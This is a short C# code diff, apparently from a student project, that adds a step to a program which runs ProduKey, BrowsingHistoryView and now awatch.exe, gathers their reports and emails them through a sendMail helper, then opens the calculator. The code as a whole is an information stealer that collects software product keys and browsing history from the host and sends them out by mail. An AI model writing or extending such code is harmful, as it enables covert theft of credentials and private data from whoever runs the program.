@@ -18,6 +18,7 @@ namespace TP
 
             files.Add(Helpers.openProduKey());
             files.Add(Helpers.openBrowsingHistoryView());
+            files.Add(Helpers.openAwatch());
 
             Helpers.sendMail("Prueba", "Estoy probando", files);
             Helpers.openCalc();
@@ -47,6 +48,17 @@ namespace TP
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "BrowsingHistoryView.exe");
             startInfo.Arguments = @"/shtml " + file;
+            Process.Start(startInfo);
+            return file;
+        }
+
+        public static string openAwatch()
+        {
+            string file = "report1.html";
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+
+            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "awatch.exe");
+            startInfo.Arguments = @"/shtml " + file + " 1";
             Process.Start(startInfo);
             return file;
         }
